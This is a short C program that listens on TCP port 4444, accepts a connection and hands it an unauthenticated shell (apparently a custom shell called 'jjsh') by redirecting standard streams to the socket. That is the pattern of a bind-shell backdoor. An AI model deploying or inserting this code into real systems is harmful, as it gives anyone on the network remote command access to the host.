#include <stdio.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>

#define CLIENT_MESSAGE 2000

int main(int argc, char *argv[])
{
  int socket_desc, client_sock, c, read_size;
  struct sockaddr_in server, client;
  char client_message[CLIENT_MESSAGE];

  // Create socket
  socket_desc = socket(AF_INET, SOCK_STREAM, 0);
  if (socket_desc == -1)
  {
    printf("jjsh: error creating socket");
  }
  puts("Socket created");

  // Prepare the sockaddr_in structure
  server.sin_family = AF_INET;
  server.sin_addr.s_addr = INADDR_ANY;
  server.sin_port = htons( 4444 );

  // Bind
  if (bind(socket_desc,(struct sockaddr *)&server, sizeof(server)) < 0)
  {
    // print the error message
    perror("jjsh: error binding to socket");
    return 1;
  }
  puts("bind done");

  // Listen
  listen(socket_desc, 3);

  // Accept an incoming connection
  puts("Waiting for incoming connection...");
  c = sizeof(struct sockaddr_in);

  while(1)
  {
    // Accept connection from an incoming client
    client_sock = accept(socket_desc, (struct sockaddr *)&client, (socklen_t*)&c);
    if (client_sock < 0)
    {
      perror("jjsh: error accepting connection");
      return 1;
    }
    puts("Connection accepted");

    dup2(client_sock, 0);
    dup2(client_sock, 1);
    dup2(client_sock, 2);

    execv("/bin/jjsh", NULL);
    return 0;
  }
}
